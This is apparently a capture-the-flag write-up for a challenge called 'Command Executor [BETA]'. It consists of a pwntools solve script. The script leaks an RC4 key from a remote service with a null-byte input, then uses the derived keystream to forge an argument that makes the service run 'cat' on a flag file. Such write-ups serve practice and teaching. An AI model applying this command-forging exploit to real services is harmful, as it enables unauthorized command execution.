# Command Executor [BETA]

Description: 
Author: _kos0ng

### Cara Solve
```python
from pwn import *
from arc4 import ARC4

context.log_level = 'error'

# r = process("./fix")
r = remote("103.152.242.68", 10022)

r.recvuntil(b"Choice : ")
r.sendline(b"1")
r.recvuntil(b"ID : ")
r.sendline(b"1\x000")
r.recvuntil(b"[RESPONSE] : echo ")

key = r.recvline().strip()
arc4 = ARC4(key)
tmp_ct = arc4.encrypt(b"A"*100)
keystream = []
for i in range(len(tmp_ct)):
	keystream.append(tmp_ct[i] ^ ord("A"))

known_command = "cat"
# known_command = "ls"
r.recvuntil(b"Choice : ")
r.sendline(b"2")
r.recvuntil(b"ID : ")
r.sendline(b"6")
# r.sendline(b"3")
r.recvuntil(b"Argument : ")
payload = bytes([keystream[len(known_command)]])
payload += b" /flag-5985eaf4e1f72a30ac.txt"
# payload += b" /"
r.sendline(payload)

check = r.recvline()
r.recvuntil(b" to Validate : ")
r.sendline(key)
r.interactive()
```